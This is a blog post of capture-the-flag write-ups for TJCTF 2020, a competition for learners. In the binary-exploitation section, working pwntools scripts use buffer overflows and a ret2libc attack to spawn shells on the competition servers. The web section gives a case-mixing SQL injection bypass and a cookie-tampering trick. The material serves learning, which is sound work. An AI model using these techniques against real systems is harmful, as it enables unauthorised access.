---
title: "TJCTF 2020"
categories: [ctf]
tags: [ctf, writeup, tjctf]
hasComments: true
date: 2020-05-27
image: /images/CTF/TJCTF2020/logo.png
description: TJCTF 2020 challenge writeups.
---

<p align="center">
  <img src="/images/CTF/TJCTF2020/logo.png"/>
</p>
  
Main CTF page: [https://tjctf.org/](https://tjctf.org/)  
CTFTime even page: [https://ctftime.org/event/928](https://ctftime.org/event/928)  
Thomas Jefferson Computer Securit Club (TJCSC): [https://activities.tjhsst.edu/csc/](https://activities.tjhsst.edu/csc/)  

TJCTF2020 was a CTF organized by the Computer Security Club from the Thomas Jefferson High School for Science and Technology. It was a very nice CTF well suited for beginners and mid-experienced players. There was a wide variety of challenges and they were pretty fun *(although some involved guessing :P)*. Their difficulty was well balanced ranging from easy to medium and they were aimed at people that, just like me, are learning the very foundations. As always, the main objective is learning and we achieved it :). 

Just like the last time, I participated along with [Kashmir54](https://twitter.com/ManuSanchez54) and [urzu](@daniel_uroz) and we ended up in 149-147th position. It's a pretty good result given the lack of time the 3 of us had. I'd like to thank both of them :)

<p align="center">
  <img src="/images/CTF/TJCTF2020/scoreboard0.png"/>
  <img src="/images/CTF/TJCTF2020/scoreboard1.png"/>
</p>


The CTF had several categories. In this page you will find the writeups for some of the challenges we solved:
  - Pwn / Binary Exploitation:
    - Seashells, Tinder and OSRS. 
  - Reverse Engineering:
    - Gym and ASMR. 
  - Web:
    - Login, Sarah Palin Fanpage and Login Sequel.
  - Crypto:
    - Tap Dancing and Titanic.

# Binary Exploitation
## Seashells

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells0.png"/>
</p>

In this challenge we're given an executable ELF64 file. I decompiled it with [Cutter](https://github.com/radareorg/cutter), the radare2 graphical interface. The first thing to always check is the protections of the binary. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells1.png"/>
</p>

As we can see, it's not a Position-Indepent Code (pic) binary and it has no canaries, only the NX bit is activated. Looking at the main code, we can easily identify the vulnerable `gets` call. The buffer used is 0xa (10) bytes long and we will need 8 padding bytes for the saved RBP (we're on 64 bits, registers are 64bits).

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells2.png"/>
</p>

This means we can overwrite the return address of the function from which `gets` is called. Now, how do we want to hijack the program execution flow? We must find some place of interest for us to jump to. `main` function has nothing interesting for us. However, if we take a look at the declared binary's functions:

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells3.png"/>
</p>

We spot a function called `shell`.

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells4.png"/>
</p>

Taking a look at it's code we can see it simply checks if a given position in memory is equal to `0xdeadcafebabebeef` and, if it is, it calls `system(/bin/sh)`.

Obviously, the objective is to spawn the shell. There are two possible solutions for this challenge, one easier than the other:
* Since we can overwrite `main`'s' return address and the binary isn't PIC, we can jump directly to pushing "/bin/sh" into the stack and calling `system()` *(blue arrow in the image above)*.
* Since the comparison is made via `rdi` register, we could look for a ROP gadget that performs: `pop rdi; ret;`, jump to it and place the value on the stack so it passes the comparison. 
<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells5.png"/><br>
  There indeed exists the needed ROP gadget.
</p> 

The first solution is obviously easier. However, in the following script I included both solutions (ROP is commented).

```python
# RazviOverflow 
# Python3
from pwn import *

#binary = process("seashells")
binary = remote("p1.tjctf.org", 8009)

shell_function_address = 0x4006c7
#pop_rdi = 0x400803
str_bin_sh = 0x004006e3

print(binary.recvuntil(b"?"))

#payload = b"A" * 0xa + b"b" * 8 + p64(pop_rdi) + p64(0xdeadcafebabebeef) + p64(shell_function_address)
payload = b"A" * 0xa + b"b" * 8 + p64(str_bin_sh) 

binary.sendline(payload)
#print(binary.recvall())
binary.interactive()
```

Executing the script spawns a shell on the server and we can get the flag.

<p align="center">
  <img src="/images/CTF/TJCTF2020/seashells6.png"/>
</p>

The flag is: tjctf{she_s3lls_se4_sh3ll5}


## Tinder

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder0.png"/>
</p>

This time we have a ELF32 executable. When executing the binary, we are asked to provide certain information like the name or the bio and the program suddenly stops. This time I used IDA to disassemble it. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder1.png"/>
</p>

There are 4 consecutive calls to `input` function. Understanding `input` function is very easy, it's just a wrapper for `fgets` that performs a couple of checks. Continuing with the `main` function, we can see that, in order to get the flag, the value stored at memory address [ebp+match]\ ([ebp-0Ch]) must be equal to 0xC0D3D00D. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder2.png"/><br>
  <img src="/images/CTF/TJCTF2020/tinder3.png"/>
</p>

`input` function has a first parameter that indicates the length of the bytes that `fgets` will read from the STDIN. 

In order to understand the overall logic of the program, I used the decompiler (pseudocode) from IDA since it is easier to understand. We can see `main` calls input passing a floating number:

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder5.png"/>
</p>

And `input` uses it as a parameter for `fgets` (multiplying it by 16):

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder6.png"/>
</p>

This means that everytime the user is requested for `input`, `fgets` reads up to 16 characters, except for the bio. The bio reads up to 16\*8 (128) characters. 

It is now as simple as knowing the address or offset where the program starts writing the user-provided bio and the address or offset where the check will be performed. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder8.png"/>
</p>

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder7.png"/>
</p>

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder9.png"/>
</p>

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder10.png"/>
</p>

bio user input starts at address ebp - 0x80 while check is performed at address ebp - 0xc.

Since bio is at a lower address than check and the distance between the both positions is 116 (128 (0x80) - 12 (0xc)), we can reach and overwrite check. Please bear in mind we can write as much as 128 bytes, so writing 116 and then 0xC0D3D00D (which is 4 bytes long) is totally possible.  Remember that writing in memory always happens upwards (toward higher memory addresses). This is how the stack layout looks like:

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder11.png"/>
</p>

So the payload, when asked about the bio, will be "A" * 116 + \x0D\xD0\xD3\xC0.

Implementing it with pwntools is fairly simple. 

```python
# RazviOverflow
# Python3
from pwn import *

payload = b"A" * 116 + p32(0xC0D3D00D)
filling = b"Razvi"

#binary = process("Tinder")
binary = remote("p1.tjctf.org", 8002)

print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(filling)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())
```

<p align="center">
  <img src="/images/CTF/TJCTF2020/tinder12.png"/>
</p>

Flag is: tjctf{0v3rfl0w_0f_m4tch35}

## OSRS (Old School RuneScape)

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs00.png"/>
</p>

The binary to exploit this time has no protections at all. No PIC, no N^X bit and no canaries. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs01.png"/>
</p>

When executing it, it asks about some tree type. Dependin on the provided input, the binary either prints a number (an address) or print a brief description. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs02.png"/>
</p>

At a first glance the binary doesn't look too complicated. `main` function calls `get_tree` in order to get the input of the user.

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs03.png"/>
</p>

And `get_tree` performs a vulnerable call (`gets`). This means we can overwrite addresses in memory.  

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs04.png"/>
</p>

After the user inserts the input, it is checked to see whether it equals to some entry of the *trees* array. We don't really care what values are stored in *trees*. The interesting thing here is that whenever the user inputs a value that's not in the *trees* array, the program prints the message *I don't have the tree %d*. Since the format string has the format specifier %d, it will interpret the parameter as an integer. That is, it will print the base address of [ebp+s], aka the user input. Please notice how `gets` writes to [ebp+s]. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/osrs05.png"/>
</p>

The intended solution, as I understand it, is to take advantage of the buffer's stack address that's being leaked. These are the steps to exploit it:
- Execute the program inserting some padding and overwrite `get_tree`'s return address with the address of `get_tree` so it gets executed again and not return back to main.
- You are now in the second iteration of the program so given the address that has just been leaked (that's where the input will be), insert shellcode + padding and overwrite `get_tree`'s return address with the address leaked. 
- This way you leak the address of the input on the stack, execute the vulnerable function again, insert the shellcode and jump to it. The leak is necessary since the server has ASLR activated (we know this because stack, amongst other memory regions, are randomized). Bear in mind that overwriting `get_tree`'s return address with its own address allows us to basically have infinite iterations of the vulnerable call.

You can find writeups about the intended solution [here](https://ctftime.org/writeup/20754) and [here](https://ctftime.org/writeup/20727).

The solution I implemented is not the intended and I feel like it is somewhat an overkill for this challenge. However, it's a solution that works with this and harder challenges :)

My solution is a ret2libc attack. I performed it leaking the version of libc used in the server by printing the addresses of several dynamically loaded functions and then, using the corresponding offsets, calling system(/bin/sh) to get a shell. 

Here's the script:

```python
# RazviOverflow
# Python3

from pwn import *

binary = ELF("./binary")

#print(binary.symbols)

got_puts = p32(binary.got[b"puts"])
#got_gets = binary.got[b"gets"]
#got_libc_start_main = binary.got[b"__libc_start_main"]
got_setbuf = p32(binary.got[b"setbuf"])
got_strcasecmp = p32(binary.got[b"strcasecmp"])

plt_puts = p32(binary.plt[b"puts"])
#plt_gets = binary.plt[b"gets"]
#plt_libc_start_main = binary.plt[b"__libc_start_main"]
#plt_setbuf = binary.plt[b"setbuf"]
#plt_strcasecmp = binary.plt[b"strcasecmp"]
get_tree_addr = p32(binary.symbols[b"get_tree"])

#binary = process("binary")
'''
0x08049e74      .dword 0xf7dd3480  ; RELOC 32 setbuf        
0x08049e78      .dword 0x080483d6  ; RELOC 32 printf        
0x08049e7c      .dword 0xf7dcbb00  ; RELOC 32 gets          trailing null byte. Won't get printed by puts.
0x08049e80      .dword 0xf7dcc550  ; RELOC 32 puts
0x08049e84      .dword 0xf7d7be00  ; RELOC 32 __libc_start_main   trailing null byte. Won't get printed by puts.
0x08049e88      .dword 0xf7ebcea0  ; RELOC 32 strcasecmp
'''

# Buffer is at ebp - 0x10c 
padding = b"A" * 0x10c
padding += b"B" * 4 # saved_ebp or old_ebp, whatever you want to call it

ret_addr = get_tree_addr

payload_puts = padding + plt_puts + ret_addr + got_puts
payload_setbuf = padding + plt_puts + ret_addr + got_setbuf
payload_strcasecmp = padding + plt_puts + ret_addr + got_strcasecmp


#binary = process("./binary")
binary = remote("p1.tjctf.org", 8006)

print(binary.recvline()) # Enter a tree type 
binary.sendline(payload_puts)
binary.recvline() # I dont have the tree
puts_address = binary.recvline()[:4]
print("Address of dynamically linked puts -> " + str(hex(u32(puts_address))))
print(binary.recvline()) # Enter a tree type
binary.sendline(payload_setbuf)
binary.recvline() # I dont have the tree
setbuf_address = binary.recvline()[:4]
print("Address of dynamically linked setbuf -> " + str(hex(u32(setbuf_address))))
print(binary.recvline()) # Enter a tree type
binary.sendline(payload_strcasecmp)
binary.recvline() # I dont have the tree
strcasecmp_address = binary.recvline()[:4]
print("Address of dynamically linked sstrcasecmp -> " + str(hex(u32(strcasecmp_address))))
print(binary.recvline()) # Enter a tree type


'''
On the first run I got:
Address of dynamically linked puts -> 0xf7e5e360
Address of dynamically linked setbuf -> 0xf7e64f10
Address of dynamically linked sstrcasecmp -> 0xf7f4c5b0

According to libc.nullbyte.cat, it corresponds to libc6-i386_2.27-3ubuntu1_amd64 
I will be getting system and bin_sh_str offsets relative to puts address
'''

system_address = p32(u32(puts_address) - 0x2a650)
str_bin_sh = p32(u32(puts_address) +    0x11456f)

shell_payload = padding + system_address + b"AAAA" + str_bin_sh

binary.sendline(shell_payload)
binary.interactive()

# Flag is: tjctf{tr33_c0de_in_my_she115}
```

Flag is: tjctf{tr33_c0de_in_my_she115}

# Reversing
## Gym

<p align="center">
  <img src="/images/CTF/TJCTF2020/gym0.png"/>
</p>

In this challenge we're given a binary. Executing it asks the user to go from 211 to 180 lbs in 7 days, performing one action per day. The binary must be reversed so we can find how to reach 180.

When reversing the binary, one can notice there are 4 functions that correspond to eating healthy, doing pushups, running and sleeping. You can select one of the each day and it will subtract from the total weight a fixed number of pounds:
- [1] Eat healthy: -4
- [2] Do pushup: -1 *(It doesn't matter the text says do **50** pushups)*
- [3] Go run: -2
- [4] Go sleep: -3

If you try to reach 180 from 211 performing only 7 activities, you'll notice it is not possible. The closer is 211 - (eat_healthy * 7) = 183.

The trick can only be seen reversing the binary (hence the category of the challenge) and turns out every time the user goes to run it also sleeps. That is, every time you choose to [3] run (-2) you automatically sleep as well (-3) resulting in a total 5 pounds weight loss. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/gym1.png"/>
</p>

This way, in order to reach 180 you must go running 6 times (-30) and then do pushups (-1).

The flag is: tjctf{w3iGht_l055_i5_d1ff1CuLt}

# ASMR

<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr0.png"/>
</p>

This time we're given a NASM file. In order to compile it to an ELF and then debug it, you must use the following commands:

`nasm -f elf64 file.asm`
`ld -s -o program file.o`

After compiling it, we can see there are a lot of syscalls. Each syscall is identified by a given number, you can check them up in [this link](https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html) (there are many other resources, just google "linux systemcall list").

<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr3.png"/>
</p>

Inspecting the code you will realize the binary opens a socket in a given port at localhost and expects a password. Debugging can reveal the logic applied to the input. That is, it is XORed with 0x69 and then checked whether it equals to the numbers pointed by the arrows in the image below.

<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr1.png"/>
</p>

So, in order to get the correct password for the binary we can simply apply XOR to those numbers. Please bear in mind the numbers are in little endian order and rbp-0x48 comes first, and then rbp-0x50. That is because writing happens from lower toward higher memory addresses.

<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr4.png"/>
</p>

The script can be as simple as:

<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr5.png"/>
</p>

Notice how I added a leading 0 in order to make the byte pairing correct. Keep in mind 0xc0c10361 is the same as 0x0c0c10361 but the latter has even number of digits and hence can be correctly splitted up in bytes.


<p align="center">
  <img src="/images/CTF/TJCTF2020/asmr2.png"/>
</p>

# Web
## Login
<p align="center">
  <img src="/images/CTF/TJCTF2020/login0.png"/>
</p>

This challenge consisted of a login panel that had an obfuscated JavaScript running.

<p align="center">
  <img src="/images/CTF/TJCTF2020/login1.png"/>
</p>

Using one of many JS deobfuscators online we got the following code:

```javascript
var array_strings=['value','4312a7be33f09cc7ccd1d8a237265798','Sorry.\x20Wrong\x20username\x20or\x20password.','admin','tjctf{','getElementsByName','toString'];

(function(data, _0x31ce84) {
    var _0x55c419 = function(_0x56392e) {
        while (--_0x56392e) {
            data['push'](data['shift']());
        }
    };
    _0x55c419(++_0x31ce84);
}(array_strings, 0x1e7));

var do_things = function(i, _0x31ce84) {
    i = i - 0x0;
    return array_strings[i];
};

checkUsername = function() {
    username = document[do_things('0x1')]('username')[0x0]['value'];
    password = document[do_things('0x1')]('password')[0x0][do_things('0x3')];
    temp = md5(password)[do_things('0x2')]();
    if (username == do_things('0x6') && temp == do_things('0x4')) 
        alert(do_things('0x0') + password + '890898}');
    else 
        alert(do_things('0x5'));
};
```

We can see it it checking with the hash value in the `array_strings` array. Now solving the challenge was as easy as looking for the password hash in [crackstation](https://crackstation.net/). 

## Sarah Palin Fanpage

<p align="center">
  <img src="/images/CTF/TJCTF2020/sarah0.png"/>
</p>

In this challenge we must, somehow, be able to log in in the VIP area. The access is denied every time you try to access it. 

<p align="center">
  <img src="/images/CTF/TJCTF2020/sarah1.png"/>
</p>

In order to solve the challenge, I inspected the site's cookies on my browser. There was a base64-encoded cookie called data.

<p align="center">
  <img src="/images/CTF/TJCTF2020/sarah2.png"/>
</p>

The decoded text is easily identifiable since we've been told that in order to access the VIP area we must first like all of Sarah's top 10 moments.

<p align="center">
  <img src="/images/CTF/TJCTF2020/sarah3.png"/>
</p>

If you simply change all the *false* values in the decoded message to *true*, encode it back to base64 and replace the cookie's value, you can access the VIP area.

<p align="center">
  <img src="/images/CTF/TJCTF2020/sarah4.png"/>
</p>

## Login Sequel
<p align="center">
  <img src="/images/CTF/TJCTF2020/login_sequel0.png"/>
</p>

This challenge was a login panel vulnerable to SQL injection. However' there was some filtering to bypass. 

After many tries, we realized the WAF is filtering the "-" so we cannot comment with -- and it was also filtering `AND`, `OR`, `and`, `or` but... it was not filtering mixed case operators: `AnD`, `aNd`, `Or`, `oR`.
For 

In order to log in as admin and bypass the password check one expression like the following must be used: `admin' Or 1=1/*`, `admin' oR 1=1/*`, `admin' oR '1'='1'/*`, etc.


The flag is: tjctf{W0w_wHa1_a_SqL1_exPeRt!}

# Crypto
## Titanic

<p align="center">
  <img src="/images/CTF/TJCTF2020/titanic0.png"/>
</p>

This challenge didn't require any special skill, just finding a script of Titanic and computing the hash of every single word until they match. 

The script we used was:

```python
import re
import sys
import hashlib

def main(path):
    data = read_file(path)

    for word in re.finditer(b'[a-zA-Z0-9\']+', data):
        flag = b'tjctf{' + word.group(0).lower() + b'}'
        print(flag)
        if hashlib.md5(flag).hexdigest() == '9326ea0931baf5786cde7f280f965ebb':
            print(flag.decode('utf-8'))
            break

def read_file(path):
    with open(path, 'rb') as f:
        return f.read()

if __name__ == "__main__":
    main(sys.argv[1])

```

The flag is: tjctf{marlborough's}

## Tap Dancing

<p align="center">
  <img src="/images/CTF/TJCTF2020/tapdancing0.png"/>
</p>

This challenge was more of a guess work rather than technical skill. The file we're given contains only a ternary number: 1101111102120222020120111110101222022221022202022211.

The solution consists in translating the text to morse code. 0 is space, 1 is dash and 2 is dot.

1101111102120222020120111110101222022221022202022211
-- ----- .-. ... . -. ----- - -... ....- ... . ...--

Translates to: m0rsen0tb4se3 

The flag is: tjctf{m0rsen0tb4se3}
